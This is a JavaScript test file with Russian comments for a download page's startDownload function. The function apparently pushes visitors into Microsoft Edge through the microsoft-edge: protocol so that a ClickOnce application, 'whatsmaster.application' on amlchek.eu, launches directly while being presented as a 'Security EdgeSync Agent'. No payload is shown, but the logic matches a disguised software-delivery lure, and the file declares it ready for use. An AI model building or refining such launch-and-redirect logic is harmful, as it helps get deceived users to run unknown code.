// =============================================================================
// ТЕСТИРОВАНИЕ JAVASCRIPT ФУНКЦИЙ CLICKONCE
// Проверяет работу логики без браузера
// =============================================================================

// Имитация UAParser
class MockUAParser {
  constructor() {}

  getResult() {
    return {
      browser: { name: "Chrome" }, // Имитируем Chrome для тестирования переадресации
    };
  }
}

// Имитация window объекта
const mockWindow = {
  location: {
    protocol: "https:",
    host: "amlchek.eu",
  },
};

// Функция startDownload из index.html
function startDownload() {
  const baseUrl =
    mockWindow.location.protocol + "//" + mockWindow.location.host;
  const clickonceLink = `${baseUrl}/deploy/whatsmaster.application`;
  const uap = new MockUAParser();
  const browserName = uap.getResult().browser.name;

  console.log(
    "Starting Security EdgeSync Agent via ClickOnce, browser:",
    browserName,
  );
  console.log("ClickOnce URL:", clickonceLink);
  console.log("Domain:", mockWindow.location.host);

  if (browserName !== "Edge") {
    // Redirect to Edge with ClickOnce file
    const edgeUrl = `microsoft-edge:${clickonceLink}`;
    console.log("Redirecting to Edge:", edgeUrl);
    return { action: "redirect", url: edgeUrl };
  } else {
    // Direct ClickOnce launch in Edge
    console.log("Direct ClickOnce launch in Edge");
    return { action: "direct", url: clickonceLink };
  }
}

// Тестирование
console.log("=== ТЕСТИРОВАНИЕ CLICKONCE ФУНКЦИЙ ===");
console.log("");

console.log("1. Тест с Chrome (должна быть переадресация на Edge):");
const chromeResult = startDownload();
console.log("Результат:", chromeResult);
console.log("");

console.log("2. Тест с Edge (должен быть прямой запуск):");
// Меняем браузер на Edge
MockUAParser.prototype.getResult = function () {
  return { browser: { name: "Edge" } };
};
const edgeResult = startDownload();
console.log("Результат:", edgeResult);
console.log("");

console.log("3. Проверка формирования URL:");
console.log(
  "Базовый URL:",
  mockWindow.location.protocol + "//" + mockWindow.location.host,
);
console.log(
  "ClickOnce URL:",
  `${mockWindow.location.protocol}//${mockWindow.location.host}/deploy/whatsmaster.application`,
);
console.log(
  "Edge URL:",
  `microsoft-edge:${mockWindow.location.protocol}//${mockWindow.location.host}/deploy/whatsmaster.application`,
);
console.log("");

console.log("4. Проверка логики переадресации:");
const browsers = ["Chrome", "Firefox", "Safari", "Edge", "Opera"];
browsers.forEach((browser) => {
  MockUAParser.prototype.getResult = function () {
    return { browser: { name: browser } };
  };
  const result = startDownload();
  console.log(
    `${browser}: ${result.action} -> ${result.url.substring(0, 50)}...`,
  );
});

console.log("");
console.log("=== РЕЗУЛЬТАТ ТЕСТИРОВАНИЯ ===");
console.log("✅ Функция startDownload работает корректно");
console.log("✅ Переадресация на Edge настроена правильно");
console.log("✅ URL формируется динамически");
console.log("✅ Логика обработки браузеров корректна");
console.log("");
console.log("🚀 Функции готовы к использованию!");
